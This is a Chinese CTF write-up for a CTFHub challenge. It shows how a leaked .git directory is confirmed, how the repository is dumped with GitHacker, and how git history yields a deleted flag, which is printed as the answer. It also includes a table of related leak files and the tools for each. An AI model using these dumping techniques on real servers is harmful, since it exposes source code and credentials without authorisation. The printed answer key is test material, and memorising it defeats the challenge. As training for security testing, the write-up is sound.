---
title: .git 泄露
date: 2026-11-12
tags: [CTFHub, Web, 信息泄露, git]
excerpt: 记录通过 .git 目录泄露获取源码，并翻查提交历史找到被删除 flag 的过程。
---

思路：打开题目页面只显示一行 "Where is flag?"，说明 flag 不在页面上。这类信息泄露题的第一步是探测常见的敏感目录和文件，`.git` 是优先级最高的一个——开发者用 git 管理代码时，如果把整个过程连 `.git` 目录一起传上了服务器，就等于把源码和全部提交历史都送出去了。

问题：

1. 首先要确认 `.git` 是否真的存在。直接访问 `.git/HEAD`，如果返回 `ref: refs/heads/master` 就说明泄露了；如果返回 403 或 404，说明被拦掉了，得换思路。
2. 确认泄露后，普通浏览器只能看到一个文件一个文件地翻，而 `.git` 目录里有几百个对象文件，手动取证不现实，需要工具批量拉取。
3. 拉下来的仓库里，当前文件**没有 flag**，页面和 `index.html` 里都只有 "Where is flag?"。这一步很容易误判成"工具没用"或者"这题做不出来"。
4. 环境层面踩了坑：Ubuntu 上装的 GitHacker 是 Python 3 项目，但系统没有 `pip3`、没有安装 `git`，运行直接报 `ModuleNotFoundError: No module named 'bs4'`。

解决：

1. 先验证泄露：

```bash
wget -qO- http://challenge-4ecf9800b62186bb.sandbox.ctfhub.com:10800/.git/HEAD
```

返回 `ref: refs/heads/master`，确认存在 `.git` 泄露。

2. 修复工具环境。GitHacker 需要 5 个 Python 包，且依赖系统的 `git` 命令：

```bash
sudo apt install python3-pip python3-venv git -y
python3 -m venv ~/桌面/ctf-tools-Web/githacker/gh-env
~/桌面/ctf-tools-Web/githacker/gh-env/bin/python -m pip install \
    beautifulsoup4 coloredlogs gitpython "requests>=2.33.0" semver
```

报错对照：`No module named bs4` 是依赖缺失；`Bad git executable` 是系统没装 git。

3. 用 GitHacker 把整个仓库拉下来：

```bash
githacker --url http://challenge-4ecf9800b62186bb.sandbox.ctfhub.com:10800/.git/ \
          --output-folder ~/ctf-out
```

跑完会输出结果目录，形如：

```
INFO Check it out: /home/rabit222/ctf-out/f26e2faf0eb237c52129206ef86e34d7
```

4. 进目录查看当前文件：

```bash
cd ~/ctf-out/f26e2faf0eb237c52129206ef86e34d7
ls
```

只有 `index.html` 和 `50x.html`，打开都没有 flag。

5. **关键一步：不看当前文件，看提交历史。**

```bash
git log --oneline
```

输出：

```
665bd3a remove flag
0048aa9 add flag
8ce2dbd init
```

一眼就能看出：有人加过 flag，后来又删掉了。当前是删除之后的状态。

6. 查看那次删除操作：

```bash
git show 665bd3a
```

输出里有一行被删除的内容：

```diff
-ctfhub{a7056f3e088e3c57daa1d172}
```

`-` 开头表示这一行在本次提交中被移除，flag 拿到。

7. 偷懒做法，一条命令直接搜：

```bash
git log -p | grep ctfhub
```

---

## 原理

git 是追加式的版本控制系统。删除一个文件并不是真的把它擦掉，而是记录一条"我删掉了它"的操作，原内容依然完整保存在历史对象里。所以只要拿到完整的 `.git` 目录，就等于拿到了这个项目从初始化到现在的每一步。

开发者以为"把文件里的 flag 删掉就安全了"，实际上删除动作本身也被记录了下来，而且记录里还带着删除之前的完整内容。

## 这题的判断点

看到当前文件没有 flag 时，不要急着换工具或换思路，先想一想：**git 仓库的价值从来不只有"当前版本"，还有"历史版本"。**

```
.git 泄露
    ↓
拉下仓库
    ↓
当前文件没 flag
    ↓
不是死路 → 翻历史
    ↓
git log / git show / git log -p
    ↓
拿到 flag
```

## 命令速查

| 命令 | 用途 |
| --- | --- |
| `git log --oneline` | 看全部提交记录 |
| `git show <哈希>` | 看某次提交的具体改动 |
| `git log -p` | 看全部提交 + 全部代码改动 |
| `git branch -a` | 看所有分支 |
| `git stash list` | 看被 stash 藏起来的改动 |
| `git tag` | 看所有标签 |
| `git log -p \| grep -i flag` | 在所有历史里搜 flag |

## 同类泄露

| 泄露文件 | 利用方式 |
| --- | --- |
| `.git` | githacker / git-dumper 拉取仓库 |
| `.svn` | `rip-svn.pl` |
| `.hg` | `rip-hg.pl` |
| `.DS_Store` | 解析出目录下的隐藏文件名 |
| `.idea` / `.vscode` | 直接读取，常含路径和账号信息 |
| `www.zip` / `backup.zip` | 下载解压，密码常在同目录 |

共同点：**都是"不该上线的文件被一起传上了服务器"**。

## Flag

```
ctfhub{a7056f3e088e3c57daa1d172}
```
